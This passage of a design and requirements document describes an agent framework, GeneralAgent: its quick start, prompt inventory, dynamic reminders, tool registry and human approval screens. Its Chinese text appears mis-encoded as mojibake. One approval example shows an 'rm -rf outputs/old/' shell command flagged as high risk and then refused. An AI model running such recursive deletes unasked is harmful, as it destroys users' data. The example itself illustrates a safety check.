| **CLIäº¤äº’** | `generalAgent/cli.py`, `shared/cli/base_cli.py` |

---

# å¿«é€Ÿå¼€å§‹

### 5åˆ†é’Ÿä¸Šæ‰‹

**1. å®‰è£…ä¾èµ–**
```bash
# Python 3.12+
uv sync
# æˆ–: pip install -e .
```

**2. å¯åŠ¨åº”ç”¨**
```bash
uv run main.py
```

**3. ç¬¬ä¸€æ¬¡å¯¹è¯**
```
User> ä½ å¥½,è¯·ä»‹ç»ä¸€ä¸‹ä½ çš„èƒ½åŠ›
Agent> [ä»‹ç»å·¥å…·å’ŒæŠ€èƒ½]

User> @pdf å¸®æˆ‘å¡«å†™è¿™ä¸ªè¡¨å•
Agent> [åŠ è½½PDFæŠ€èƒ½,æ‰§è¡Œä»»åŠ¡]
```

### å¼€å‘ç¬¬ä¸€ä¸ªå·¥å…·

**åˆ›å»ºè‡ªå®šä¹‰å·¥å…·** (5åˆ†é’Ÿ):
```python
# generalAgent/tools/custom/my_tool.py
from langchain_core.tools import tool

@tool
def my_custom_tool(query: str) -> str:
    """ä½ çš„å·¥å…·æè¿°"""
    return f"å¤„ç†ç»“æœ: {query}"
```

**é…ç½®å·¥å…·**:
```yaml
# generalAgent/config/tools.yaml
optional:
  my_custom_tool:
    enabled: true
    category: "custom"
    tags: ["custom"]
```

### å¼€å‘ç¬¬ä¸€ä¸ªæŠ€èƒ½

**åˆ›å»ºæŠ€èƒ½ç›®å½•** (10åˆ†é’Ÿ):
```bash
mkdir -p skills/my_skill
cd skills/my_skill
```

**åˆ›å»ºSKILL.md**:
```markdown
# My Skill

## åŠŸèƒ½
æè¿°æŠ€èƒ½çš„åŠŸèƒ½å’Œä½¿ç”¨æ–¹æ³•

## ä½¿ç”¨æ­¥éª¤
1. æ­¥éª¤1
2. æ­¥éª¤2
```

**é…ç½®æŠ€èƒ½**:
```yaml
# generalAgent/config/skills.yaml
optional:
  my_skill:
    enabled: true
    description: "æˆ‘çš„è‡ªå®šä¹‰æŠ€èƒ½"
```
---

# Promptæ¸…å•

## äº§å“å®šä½

Promptæ¸…å•ç« èŠ‚æ±‡æ€»æ¡†æ¶ä¸­æ‰€æœ‰ä¸LLMäº¤äº’çš„æç¤ºè¯,åŒ…æ‹¬Agentç³»ç»Ÿæç¤ºã€å·¥å…·æè¿°ã€æŠ€èƒ½æ–‡æ¡£æ¨¡æ¿ã€åŠ¨æ€æé†’å’ŒHITLäº¤äº’ç•Œé¢,ä¸ºäº§å“ç»ç†ã€å¼€å‘è€…å’Œç»´æŠ¤è€…æä¾›å®Œæ•´çš„æç¤ºè¯ç®¡ç†å‚è€ƒã€‚

æœ¬ç« èŠ‚ä¸æ˜¯å®ç°ç»†èŠ‚,è€Œæ˜¯**Promptèµ„äº§ç›®å½•**,è¯´æ˜"ç³»ç»Ÿæœ‰å“ªäº›Prompt"å’Œ"æ¯ä¸ªPromptçš„ä½œç”¨å’Œä½ç½®"ã€‚

### æ ¸å¿ƒä»·å€¼

1. **å…¨å±€è§†å›¾** - ä¸€ç«™å¼æŸ¥çœ‹æ‰€æœ‰Promptèµ„æº
2. **ç»´æŠ¤æŒ‡å—** - å¿«é€Ÿå®šä½å’Œä¿®æ”¹Prompt
3. **è´¨é‡ä¿è¯** - ç¡®ä¿Promptçš„ä¸€è‡´æ€§å’Œå‡†ç¡®æ€§
4. **æˆæœ¬ä¼˜åŒ–** - è¯†åˆ«å†—é•¿Prompt,ä¼˜åŒ–Tokenæ¶ˆè€—

---

## Promptåˆ†ç±»æ€»è§ˆ

æ¡†æ¶ä¸­çš„Promptåˆ†ä¸º**5å¤§ç±»**:

```
Promptæ¸…å•
â”œâ”€â”€ 1. Agentç³»ç»Ÿæç¤º (System Prompts)
â”‚   â”œâ”€â”€ PLANNER_SYSTEM_PROMPT (ä¸»Agent)
â”‚   â””â”€â”€ SUBAGENT_SYSTEM_PROMPT (å­Agent)
â”‚
â”œâ”€â”€ 2. å·¥å…·æè¿° (Tool Descriptions)
â”‚   â”œâ”€â”€ Coreå·¥å…· (6ä¸ª)
â”‚   â”œâ”€â”€ Optionalå·¥å…· (12ä¸ª)
â”‚   â””â”€â”€ MCPå·¥å…· (å¤–éƒ¨)
â”‚
â”œâ”€â”€ 3. æŠ€èƒ½æ–‡æ¡£æ¨¡æ¿ (Skill Templates)
â”‚   â”œâ”€â”€ SKILL.mdç»“æ„æ¨¡æ¿
â”‚   â””â”€â”€ 6ä¸ªå†…ç½®æŠ€èƒ½çš„SKILL.md
â”‚
â”œâ”€â”€ 4. åŠ¨æ€æé†’ (Dynamic Reminders)
â”‚   â”œâ”€â”€ TODOåˆ—è¡¨æé†’
â”‚   â”œâ”€â”€ @mentionåŠ è½½æé†’
â”‚   â”œâ”€â”€ æ–‡ä»¶ä¸Šä¼ æé†’
â”‚   â””â”€â”€ ä¸Šä¸‹æ–‡å‹ç¼©æé†’
â”‚
â””â”€â”€ 5. HITLäº¤äº’ç•Œé¢ (HITL UI)
    â”œâ”€â”€ ask_humanæé—®ç•Œé¢
    â””â”€â”€ å·¥å…·å®¡æ‰¹ç•Œé¢
```

**ç»Ÿè®¡æ•°æ®**:
- **æ€»Promptæ•°**: ~30ä¸ª
- **æœ€å¤§Prompt**: PLANNER_SYSTEM_PROMPT (~8000 tokens)
- **æœ€å°Prompt**: nowå·¥å…·æè¿° (~50 tokens)
- **æ€»Tokenæ¶ˆè€—**: ~15K tokens/è½® (åŒ…å«å·¥å…·æè¿°)

---

## 1. Agentç³»ç»Ÿæç¤º

### 1.1 PLANNER_SYSTEM_PROMPT (ä¸»Agent)

**ç”¨é€”**: GeneralAgentçš„æ ¸å¿ƒç³»ç»Ÿæç¤º,å®šä¹‰Agentèº«ä»½ã€èƒ½åŠ›ã€å·¥ä½œæµç¨‹å’Œçº¦æŸ

**ä½ç½®**: `generalAgent/graph/prompts.py:PLANNER_SYSTEM_PROMPT`

**ç»“æ„**:
```
1. èº«ä»½å®šä¹‰ (~200 tokens)
   - ä½ æ˜¯GeneralAgent

2. æ ¸å¿ƒèƒ½åŠ› (~500 tokens)
   - å·¥å…·è°ƒç”¨
   - æŠ€èƒ½ä½¿ç”¨
   - æ–‡ä»¶æ“ä½œ
   - å¤šæ¨¡æ€å¤„ç†

3. å·¥ä½œæµç¨‹ (~800 tokens)
   - Agent Loopæ­¥éª¤
   - å·¥å…·å¯è§æ€§è§„åˆ™
   - æŠ€èƒ½åŠ è½½æµç¨‹
   - delegate_taskä½¿ç”¨åœºæ™¯

4. æŠ€èƒ½ç›®å½• (~2000 tokens, åŠ¨æ€ç”Ÿæˆ)
   - enabledæŠ€èƒ½åˆ—è¡¨
   - æ¯ä¸ªæŠ€èƒ½çš„æè¿°å’Œç”¨é€”
   - è‡ªåŠ¨åŠ è½½è§„åˆ™

5. çº¦æŸå’Œæœ€ä½³å®è·µ (~500 tokens)
   - ä¸è¦ä½¿ç”¨ä¸å­˜åœ¨çš„å·¥å…·
   - æ€»æ˜¯ä½¿ç”¨read_fileè¯»å–SKILL.md
   - å§”æ´¾ä»»åŠ¡æ—¶ç»™å‡ºè¯¦ç»†æè¿°

6. æ—¶é—´æˆ³ (~50 tokens, åˆ†é’Ÿçº§)
   <current_datetime>2025-10-31 20:00 UTC</current_datetime>
```

**Tokenä¼°ç®—**:
- å›ºå®šéƒ¨åˆ†: ~4000 tokens
- æŠ€èƒ½ç›®å½•: ~2000 tokens (6ä¸ªæŠ€èƒ½)
- **æ€»è®¡**: ~6000 tokens (ä¼šè¯æœŸé—´ä¸å˜, KV Cacheå‹å¥½)

**å…³é”®è®¾è®¡**:
- âœ… **å›ºå®šå†…å®¹**: ç³»ç»Ÿæç¤ºåœ¨ä¼šè¯åˆå§‹åŒ–æ—¶ç”Ÿæˆ,ä¹‹åä¸å˜
- âœ… **æŠ€èƒ½ç›®å½•è¿‡æ»¤**: åªåŒ…å«`enabled: true`çš„æŠ€èƒ½

**å‚è€ƒä»£ç **: `generalAgent/graph/prompts.py:19-150`

---

### 1.2 SUBAGENT_SYSTEM_PROMPT (å­Agent)

**ç”¨é€”**: delegate_taskåˆ›å»ºçš„å­Agentçš„ç³»ç»Ÿæç¤º,ä¸“æ³¨äºå•ä¸€ä»»åŠ¡æ‰§è¡Œ

**ä½ç½®**: `generalAgent/graph/prompts.py:SUBAGENT_SYSTEM_PROMPT`

**ç»“æ„**:
```
1. èº«ä»½å®šä¹‰ (~150 tokens)
   - ä½ æ˜¯Subagent
   - ç”±MainAgentå§”æ´¾ç‰¹å®šä»»åŠ¡

2. ä¸Šä¸‹æ–‡è¯´æ˜ (~200 tokens)
   - ä½ çœ‹ä¸åˆ°ä¸»å¯¹è¯å†å²
   - åªèƒ½çœ‹åˆ°ä»»åŠ¡æè¿°

3. å·¥ä½œè¦æ±‚ (~300 tokens)
   - ä¸“æ³¨å®Œæˆå½“å‰ä»»åŠ¡
   - ç”Ÿæˆè¯¦ç»†æ€»ç»“(>200å­—ç¬¦)
   - åŒ…å«:åšäº†ä»€ä¹ˆã€å‘ç°äº†ä»€ä¹ˆã€ç»“æœæ˜¯ä»€ä¹ˆ

4. æ—¶é—´æˆ³ (~50 tokens)
   <current_datetime>2025-10-31 20:00 UTC</current_datetime>
```

**å‚è€ƒä»£ç **: `generalAgent/graph/prompts.py:152-180`

---

## 2. å·¥å…·æè¿°

æ‰€æœ‰å·¥å…·çš„æè¿°é€šè¿‡LangChainçš„`@tool`è£…é¥°å™¨è‡ªåŠ¨ç”Ÿæˆ,åŒ…å«å·¥å…·åç§°ã€å‚æ•°è¯´æ˜å’Œä½¿ç”¨ç¤ºä¾‹ã€‚

**Coreå·¥å…·** (6ä¸ª,å§‹ç»ˆå¯è§):
- FR-PROMPT-001: now - è·å–å½“å‰UTCæ—¶é—´
- FR-PROMPT-002: todo_write - åˆ›å»ºå’Œæ›´æ–°TODOåˆ—è¡¨
- FR-PROMPT-003: todo_read - è¯»å–TODOåˆ—è¡¨
- FR-PROMPT-004: delegate_task - å§”æ´¾ä»»åŠ¡ç»™å­Agent
- FR-PROMPT-005: call_agent - è°ƒç”¨å…¶ä»–ç±»å‹çš„Agent
- FR-PROMPT-006: ask_human - å‘ç”¨æˆ·æé—®

**Optionalå·¥å…·** (10ä¸ª,å¯é€‰åŠ è½½):
- FR-PROMPT-007: read_file - è¯»å–æ–‡ä»¶å†…å®¹
- FR-PROMPT-008: write_file - å†™å…¥æ–‡ä»¶
- FR-PROMPT-009: edit_file - ç²¾ç¡®ç¼–è¾‘æ–‡ä»¶
- FR-PROMPT-010: find_files - æŒ‰åç§°æŸ¥æ‰¾æ–‡ä»¶
- FR-PROMPT-011: search_file - æœç´¢æ–‡ä»¶å†…å®¹
- FR-PROMPT-012: list_workspace_files - åˆ—å‡ºå·¥ä½œåŒºæ–‡ä»¶
- FR-PROMPT-013: fetch_web - è·å–ç½‘é¡µå†…å®¹
- FR-PROMPT-014: search_web - æœç´¢ç½‘é¡µ
- FR-PROMPT-015: run_bash_command - æ‰§è¡Œbashå‘½ä»¤
- FR-PROMPT-016: compact_context - æ‰‹åŠ¨å‹ç¼©ä¸Šä¸‹æ–‡

**å·¥å…·æè¿°ç¤ºä¾‹** (nowå·¥å…·):
```python
"""Get current UTC time in ISO 8601 format.

Returns:
    str: Current UTC time (e.g., "2025-10-31T20:00:00Z")

Example:
    now() -> "2025-10-31T20:00:00Z"
"""
```

**Tokenä¼°ç®—**:
- Coreå·¥å…·: ~1200 tokens (6ä¸ª Ã— ~200 tokens)
- Optionalå·¥å…·: ~1800 tokens (10ä¸ª Ã— ~180 tokens)

**å‚è€ƒä»£ç **: `generalAgent/tools/builtin/*.py`

---

## 3. æŠ€èƒ½æ–‡æ¡£æ¨¡æ¿

### 3.1 SKILL.mdæ ‡å‡†ç»“æ„

æ‰€æœ‰æŠ€èƒ½çš„SKILL.mdéµå¾ªç»Ÿä¸€ç»“æ„:

# {æŠ€èƒ½åç§°}

## æ¦‚è¿°
ç®€è¦è¯´æ˜æŠ€èƒ½ç”¨é€”å’Œé€‚ç”¨åœºæ™¯(2-3å¥è¯)

## ä½¿ç”¨åœºæ™¯
- åœºæ™¯1: æè¿°
- åœºæ™¯2: æè¿°
- åœºæ™¯3: æè¿°

## ä½¿ç”¨æ–¹æ³•

### æ­¥éª¤1: å‡†å¤‡å·¥ä½œ
è¯¦ç»†è¯´æ˜ç¬¬ä¸€æ­¥æ“ä½œ...

### æ­¥éª¤2: æ‰§è¡Œä»»åŠ¡
è¯¦ç»†è¯´æ˜ç¬¬äºŒæ­¥æ“ä½œ...

### æ­¥éª¤3: éªŒè¯ç»“æœ
å¦‚ä½•æ£€æŸ¥ä»»åŠ¡å®Œæˆæƒ…å†µ...

## å¯ç”¨è„šæœ¬

### script1.py
- **ç”¨é€”**: è„šæœ¬åŠŸèƒ½è¯´æ˜
- **å‚æ•°**:
  - arg1: è¯´æ˜
  - arg2: è¯´æ˜
- **ç¤ºä¾‹**:
  ```bash
  python skills/{skill_id}/scripts/script1.py arg1 arg2
  ```

## æ³¨æ„äº‹é¡¹
- æ³¨æ„ç‚¹1
- æ³¨æ„ç‚¹2

## å‚è€ƒèµ„æ–™
- é“¾æ¥1
- é“¾æ¥2

**Tokenä¼°ç®—**: 500-1500 tokens/æŠ€èƒ½

---

### 3.2 å†…ç½®å‚è€ƒæŠ€èƒ½SKILL.mdæ¸…å•

**FR-PROMPT-017**: pdfæŠ€èƒ½ (~1200 tokens)
- ä½ç½®: `skills/pdf/SKILL.md`
- ç”¨é€”: PDFå¤„ç†(è¡¨å•å¡«å†™ã€å†…å®¹æå–ã€åˆå¹¶æ‹†åˆ†)

**FR-PROMPT-018**: docxæŠ€èƒ½ (~1000 tokens)
- ä½ç½®: `skills/docx/SKILL.md`
- ç”¨é€”: Wordæ–‡æ¡£å¤„ç†(å†…å®¹æå–ã€æ ·å¼ä¿®æ”¹ã€è¡¨æ ¼æ“ä½œ)

**FR-PROMPT-019**: xlsxæŠ€èƒ½ (~1100 tokens)
- ä½ç½®: `skills/xlsx/SKILL.md`
- ç”¨é€”: Excelè¡¨æ ¼å¤„ç†(æ•°æ®è¯»å†™ã€å…¬å¼è®¡ç®—ã€å›¾è¡¨ç”Ÿæˆ)

**FR-PROMPT-020**: pptxæŠ€èƒ½ (~900 tokens)
- ä½ç½®: `skills/pptx/SKILL.md`
- ç”¨é€”: PowerPointå¤„ç†(å†…å®¹æå–ã€å¹»ç¯ç‰‡ç”Ÿæˆ)

**FR-PROMPT-021**: artifactsæŠ€èƒ½ (~800 tokens)
- ä½ç½®: `skills/artifacts/SKILL.md`
- ç”¨é€”: ç”Ÿæˆå¯äº¤äº’å†…å®¹(HTML/SVG/Mermaid/React)

**FR-PROMPT-022**: skill-creatoræŠ€èƒ½ (~700 tokens)
- ä½ç½®: `skills/skill-creator/SKILL.md`
- ç”¨é€”: è¾…åŠ©åˆ›å»ºæ–°æŠ€èƒ½åŒ…

---

## 4. åŠ¨æ€æé†’

åŠ¨æ€æé†’åœ¨è¿è¡Œæ—¶ç”Ÿæˆ,è¿½åŠ åˆ°æœ€åä¸€æ¡ HumanMessage æœ«å°¾,å®ç°KV Cacheå‹å¥½ã€‚

### 4.1 TODOåˆ—è¡¨æé†’

**è§¦å‘æ¡ä»¶**: å­˜åœ¨æœªå®Œæˆçš„TODOé¡¹

**æ ¼å¼**:
```xml
<system_reminder>
Your todo list has changed. Here are the latest contents:

[1. [completed] Read requirements
2. [in_progress] Write code
3. [pending] Run tests]

Continue with the current task if applicable.
</system_reminder>
```

**Tokenä¼°ç®—**: 50-200 tokens

**ç”Ÿæˆä½ç½®**: `generalAgent/graph/prompts.py:build_dynamic_reminders()`

---

### 4.2 @mentionåŠ è½½æé†’

**è§¦å‘æ¡ä»¶**: ç”¨æˆ·ä½¿ç”¨@mentionåŠ è½½å·¥å…·æˆ–æŠ€èƒ½

**æ ¼å¼** (å·¥å…·):
```xml
<system_reminder>
Tool '@fetch_web' has been loaded and is now available for use.
</system_reminder>
```

**æ ¼å¼** (æŠ€èƒ½):
```xml
<system_reminder>
Skill '@pdf' has been linked to workspace.

Please read the skill documentation:
- read_file("skills/pdf/SKILL.md")

Then follow the instructions to complete the task.
Available tool: run_bash_command (for executing scripts)
</system_reminder>
```

**Tokenä¼°ç®—**: 30-100 tokens/æé†’

**ç”Ÿæˆä½ç½®**: `generalAgent/cli.py:process_mentions()`

---

### 4.3 æ–‡ä»¶ä¸Šä¼ æé†’

**è§¦å‘æ¡ä»¶**: ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶(é€šè¿‡#filenameè¯­æ³•)

**æ ¼å¼**:
```xml
<system_reminder>
File uploaded: report.pdf
- Location: uploads/report.pdf
- Format: PDF
- Size: 2.5 MB

Suggested actions:
- read_file("uploads/report.pdf") for preview
- search_file("uploads/report.pdf", "keyword") for content search
- @pdf for PDF-specific operations
</system_reminder>
```

**Tokenä¼°ç®—**: 50-150 tokens/æ–‡ä»¶

**ç”Ÿæˆä½ç½®**: `generalAgent/cli.py:process_file_uploads()`

---

## 5. HITLäº¤äº’ç•Œé¢

### 5.1 ask_humanæé—®ç•Œé¢

**ç”¨é€”**: Agentä¸»åŠ¨å‘ç”¨æˆ·æé—®

**æ ¼å¼**:
```
ğŸ’¬ {question}

{context (å¦‚æœæä¾›)}

(é»˜è®¤: {default}) >
```

**ç¤ºä¾‹**:
```
ğŸ’¬ æ‚¨å¸Œæœ›æŠ¥å‘Šä»¥ä»€ä¹ˆæ ¼å¼è¾“å‡º?

æ”¯æŒçš„æ ¼å¼: PDF, Markdown, HTML

(é»˜è®¤: markdown) > PDF
```

**Tokenä¼°ç®—**: æé—®å†…å®¹çš„tokenæ•° + ~20 tokens (æ ¼å¼åŒ–)

**ç”Ÿæˆä½ç½®**: `generalAgent/cli.py:handle_ask_human()`

---

### 5.2 å·¥å…·å®¡æ‰¹ç•Œé¢

**ç”¨é€”**: å±é™©å·¥å…·éœ€è¦ç”¨æˆ·å®¡æ‰¹

**æ ¼å¼**:
```
ğŸ›¡ï¸  å·¥å…·å®¡æ‰¹: {tool_name}

åŸå› : {reason}
é£é™©çº§åˆ«: {risk_level}

å‚æ•°:
  {arg1}: {value1}
  {arg2}: {value2}

æ‰¹å‡†æ‰§è¡Œ? [y/n] >
```

**ç¤ºä¾‹**:
```
ğŸ›¡ï¸  å·¥å…·å®¡æ‰¹: run_bash_command

åŸå› : æ£€æµ‹åˆ°å±é™©å‘½ä»¤(é€’å½’åˆ é™¤)
é£é™©çº§åˆ«: high

å‚æ•°:
  command: rm -rf outputs/old/
  timeout: 30

æ‰¹å‡†æ‰§è¡Œ? [y/n] > n

âŒ å·²æ‹’ç»æ‰§è¡Œ
```

**Tokenä¼°ç®—**: å‚æ•°å†…å®¹çš„tokenæ•° + ~50 tokens (æ ¼å¼åŒ–)

**ç”Ÿæˆä½ç½®**: `generalAgent/cli.py:handle_approval_request()`

---

## å‚è€ƒä»£ç ä½ç½®

| Promptç±»å‹ | ä¸»è¦æ–‡ä»¶è·¯å¾„ |
|------------|-------------|
| **Agentç³»ç»Ÿæç¤º** | `generalAgent/graph/prompts.py` |
| **å·¥å…·æè¿°** | `generalAgent/tools/builtin/*.py`, `generalAgent/tools/custom/*.py` |
| **æŠ€èƒ½æ–‡æ¡£** | `skills/*/SKILL.md` |
| **åŠ¨æ€æé†’æ„å»º** | `generalAgent/graph/prompts.py:build_dynamic_reminders()` |
| **TODOæé†’** | `generalAgent/graph/prompts.py:181-195` |
| **@mentionæé†’** | `generalAgent/cli.py:process_mentions()` |
| **æ–‡ä»¶ä¸Šä¼ æé†’** | `generalAgent/cli.py:process_file_uploads()` |
| **ask_humanç•Œé¢** | `generalAgent/cli.py:handle_ask_human()` |
| **å®¡æ‰¹ç•Œé¢** | `generalAgent/cli.py:handle_approval_request()` |

---

# ä¸€ã€å·¥å…·ç³»ç»Ÿ

## äº§å“å®šä½

å·¥å…·ç³»ç»Ÿæ˜¯æ¡†æ¶çš„èƒ½åŠ›æ‰©å±•å±‚,é€šè¿‡æ ‡å‡†åŒ–çš„LangChain @toolè£…é¥°å™¨æ¥å£,ä¸ºAI Agentæä¾›ä¸å¤–éƒ¨ä¸–ç•Œäº¤äº’çš„èƒ½åŠ›ã€‚ç³»ç»Ÿé‡‡ç”¨ä¸‰å±‚æ¶æ„(discovered/enabled/runtime)å’Œ@mentionæŒ‰éœ€åŠ è½½æœºåˆ¶,è®©å¼€å‘è€…èƒ½å¤Ÿä»¥åˆ†é’Ÿçº§é€Ÿåº¦æ·»åŠ æ–°å·¥å…·,åŒæ—¶ä¿è¯ä¼ä¸šçº§å®‰å…¨(å››å±‚å®¡æ‰¹æœºåˆ¶)å’ŒMCPåè®®å…¼å®¹æ€§ã€‚

**æ ¸å¿ƒä»·å€¼**:
- **å¿«é€Ÿæ‰©å±•**: åˆ›å»ºPythonæ–‡ä»¶å³è‡ªåŠ¨å‘ç°,é›¶é…ç½®æ¥å…¥
- **å¼€ç®±å³ç”¨**: å†…ç½®å·¥å…·è¦†ç›–æ–‡ä»¶æ“ä½œã€ç½‘ç»œè¯·æ±‚ã€ä»»åŠ¡ç®¡ç†ã€å¤šAgentåä½œ
- **æŒ‰éœ€åŠ è½½**: @mentionæœºåˆ¶èŠ‚çœtoken,ä»…åŠ è½½éœ€è¦çš„å·¥å…·
- **å®‰å…¨å¯æ§**: å››å±‚HITLå®¡æ‰¹è§„åˆ™,æ£€æµ‹å±é™©æ“ä½œ

---

## æ ¸å¿ƒå·¥å…·æ¸…å•

### æ ¸å¿ƒå·¥å…·(Core Tools)

| å·¥å…·åç§° | åŠŸèƒ½ | ä½¿ç”¨åœºæ™¯ |
|---------|------|---------|
| `now` | è·å–å½“å‰UTCæ—¶é—´ | ç”Ÿæˆå¸¦æ—¶é—´æˆ³çš„æŠ¥å‘Š |
| `todo_write` | åˆ›å»º/æ›´æ–°ä»»åŠ¡åˆ—è¡¨ | ä»»åŠ¡è¿½è¸ªå’Œè¿›åº¦ç®¡ç† |
| `todo_read` | è¯»å–ä»»åŠ¡çŠ¶æ€ | æ£€æŸ¥ä»»åŠ¡å®Œæˆæƒ…å†µ |
| `delegate_task` | å§”æ´¾ä»»åŠ¡ç»™Subagent | åˆ†è§£å¤æ‚ä»»åŠ¡ |
| `call_agent` | è°ƒç”¨å…¶ä»–Agent | Multi-Agentåä½œ |
| `ask_human` | å‘ç”¨æˆ·æé—® | HITLäº¤äº’ |

### æ–‡ä»¶æ“ä½œå·¥å…·

| å·¥å…·åç§° | åŠŸèƒ½ | æ”¯æŒæ ¼å¼ |
|---------|------|---------|
| `read_file` | è¯»å–æ–‡ä»¶å†…å®¹ | TXT, PDF, DOCX, XLSX, PPTX |
| `write_file` | å†™å…¥æ–‡ä»¶ | TXT, JSON, Markdown |
| `edit_file` | ç²¾ç¡®å­—ç¬¦ä¸²æ›¿æ¢ | æ‰€æœ‰æ–‡æœ¬æ ¼å¼ |
| `find_files` | æ–‡ä»¶åæ¨¡å¼åŒ¹é… | Globæ¨¡å¼(å¦‚`*.pdf`) |
| `search_file` | æ–‡ä»¶å†…å®¹æœç´¢ | æ–‡æœ¬æ–‡ä»¶å’Œæ–‡æ¡£ |
| `list_workspace_files` | åˆ—å‡ºå·¥ä½œåŒºæ–‡ä»¶ | å…¨éƒ¨æ ¼å¼ |

### ç½‘ç»œå·¥å…·

| å·¥å…·åç§° | åŠŸèƒ½ | API |
|---------|------|-----|
| `fetch_web` | è·å–ç½‘é¡µå†…å®¹ | Jina Reader |
| `search_web` | æœç´¢å¼•æ“æŸ¥è¯¢ | Google Custom Search |

### æ‰§è¡Œå·¥å…·

| å·¥å…·åç§° | åŠŸèƒ½ | å®‰å…¨æ§åˆ¶ |
|---------|------|---------|
| `run_bash_command` | æ‰§è¡ŒShellå‘½ä»¤ | HITLå®¡æ‰¹(é»˜è®¤ç¦ç”¨@mention) |

### ä¸Šä¸‹æ–‡ç®¡ç†å·¥å…·

| å·¥å…·åç§° | åŠŸèƒ½ | è§¦å‘æ—¶æœº |
|---------|------|---------|
| `compact_context` | æ‰‹åŠ¨å‹ç¼©ä¸Šä¸‹æ–‡ | Tokenä½¿ç”¨ç‡>75%æ—¶åŠ¨æ€åŠ è½½ |

---

## ä¸‰å±‚æ¶æ„

### æ¶æ„è®¾è®¡

```
ToolRegistry
â”œâ”€â”€ _discovered (æ‰€æœ‰æ‰«æåˆ°çš„å·¥å…·)
â”‚   â”œâ”€â”€ builtin tools (18ä¸ªå†…ç½®å·¥å…·)
â”‚   â””â”€â”€ custom tools (ç”¨æˆ·è‡ªå®šä¹‰)
â”‚
â”œâ”€â”€ _tools (å¯åŠ¨æ—¶åŠ è½½çš„å·¥å…·)
â”‚   â”œâ”€â”€ core tools (always enabled)
â”‚   â””â”€â”€ optional tools (enabled: true)
â”‚
â””â”€â”€ runtime visible tools (æ¯ä¸ªä¼šè¯å¯è§çš„å·¥å…·)
    â”œâ”€â”€ persistent tools (å…¨å±€å·¥å…·)
    â”œâ”€â”€ @mentioned tools (æŒ‰éœ€åŠ è½½)
    â””â”€â”€ skill allowed tools (æŠ€èƒ½æƒé™)
```

### å·¥å…·åŠ è½½æµç¨‹

```
1. æ‰«æé˜¶æ®µ(å¯åŠ¨æ—¶)
   - æ‰«æ generalAgent/tools/builtin/
   - æ‰«æ generalAgent/tools/custom/
   - å­˜å…¥ _discovered

2. åˆå§‹åŒ–é˜¶æ®µ(å¯åŠ¨æ—¶)
   - åŠ è½½ core tools (always enabled)
   - åŠ è½½ optional tools (enabled: true)
   - å­˜å…¥ _tools

3. è¿è¡Œæ—¶é˜¶æ®µ(æ¯ä¸ªä¼šè¯)
   - æŒä¹…åŒ–å·¥å…·(é»˜è®¤å¯è§)
   - @mention åŠ¨æ€åŠ è½½
   - æŠ€èƒ½å·¥å…·ç»§æ‰¿
```

---

## é…ç½®ç®¡ç†

é…ç½®æ–‡ä»¶:`generalAgent/config/tools.yaml`

```yaml
# Core tools - Always enabled
core:
  now:
    category: "meta"
    tags: ["meta", "time"]
    description: "Get current UTC time"

  todo_write:
    category: "meta"
    tags: ["meta", "task"]
    description: "Create/update TODO list"

# Optional tools - Can be enabled/disabled
optional:
  fetch_web:
    enabled: true                  # Load at startup
    available_to_subagent: true    # Subagent can inherit
    category: "network"
    tags: ["network", "read", "web"]
    description: "Fetch web pages using Jina Reader"

  run_bash_command:
    enabled: false                 # Require @mention
    category: "execution"
    tags: ["execute", "bash", "shell"]
    description: "Execute bash commands (dangerous)"
```

---

## MCPåè®®é›†æˆ

### æ”¯æŒçš„MCPå·¥å…·æœåŠ¡å™¨

æ¡†æ¶æ”¯æŒé€šè¿‡MCP (Model Context Protocol) é›†æˆå¤–éƒ¨å·¥å…·:

```bash
# .mcp-config.json
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem@0.6.0", "/Users/user/projects"]
    },
    "brave-search": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-brave-search@0.6.3"],
      "env": {
        "BRAVE_API_KEY": "your-key"
      }
    }
  }
}
```

### MCPå·¥å…·è½¬æ¢

MCPå·¥å…·è‡ªåŠ¨è½¬æ¢ä¸ºLangChainå·¥å…·:

```
MCP Tool Schema â†’ LangChain @tool
â”œâ”€â”€ name â†’ tool.name
â”œâ”€â”€ description â†’ tool.description
â”œâ”€â”€ inputSchema â†’ tool.args_schema
â””â”€â”€ handler â†’ tool.func
```

---
## åŠŸèƒ½éœ€æ±‚

### Coreå·¥å…·éœ€æ±‚

#### FR-TOOL-001: nowå·¥å…· - æ—¶é—´è·å–

**éœ€æ±‚æè¿°**:
ç³»ç»Ÿåº”æä¾›è·å–å½“å‰UTCæ—¶é—´çš„å·¥å…·,æ”¯æŒAgentç”Ÿæˆå¸¦æ—¶é—´æˆ³çš„å†…å®¹ã€‚

**æ ¸å¿ƒèƒ½åŠ›**:
- âœ… è¿”å›å½“å‰UTCæ—¶é—´
- âœ… ISO 8601æ ¼å¼: `2025-10-31T20:00:00Z`
- âœ… æ— å‚æ•°,å³æ—¶è¿”å›
- âœ… å§‹ç»ˆå¯ç”¨(Coreå·¥å…·)

**ä½¿ç”¨åœºæ™¯**:
- ç”ŸæˆæŠ¥å‘Šæ—¶æ·»åŠ æ—¶é—´æˆ³
- è®°å½•äº‹ä»¶å‘ç”Ÿæ—¶é—´
- è®¡ç®—æ—¶é—´å·®å’ŒæŒç»­æ—¶é—´
- ç”Ÿæˆå¸¦æ—¥æœŸçš„æ–‡ä»¶å

**éªŒæ”¶æ ‡å‡†**:
- âœ… è¿”å›æ ¼å¼ç¬¦åˆISO 8601æ ‡å‡†
- âœ… æ—¶åŒºä¸ºUTC(é¿å…æ—¶åŒºæ··æ·†)
- âœ… å“åº”æ—¶é—´<10ms
- âœ… æ— éœ€é…ç½®,å¼€ç®±å³ç”¨

**å‚è€ƒä»£ç **: `generalAgent/tools/builtin/now.py`

---

#### FR-TOOL-002: todo_writeå·¥å…· - ä»»åŠ¡åˆ›å»ºä¸æ›´æ–°

**éœ€æ±‚æè¿°**:
ç³»ç»Ÿåº”æä¾›ä»»åŠ¡åˆ—è¡¨ç®¡ç†å·¥å…·,æ”¯æŒåˆ›å»ºã€æ›´æ–°ã€æ ‡è®°å®Œæˆä»»åŠ¡,è¿½è¸ªä»»åŠ¡è¿›åº¦ã€‚

**æ ¸å¿ƒèƒ½åŠ›**:
- âœ… åˆ›å»ºä»»åŠ¡: æ·»åŠ æ–°ä»»åŠ¡åˆ°åˆ—è¡¨
- âœ… æ›´æ–°ä»»åŠ¡: ä¿®æ”¹ä»»åŠ¡å†…å®¹å’ŒçŠ¶æ€
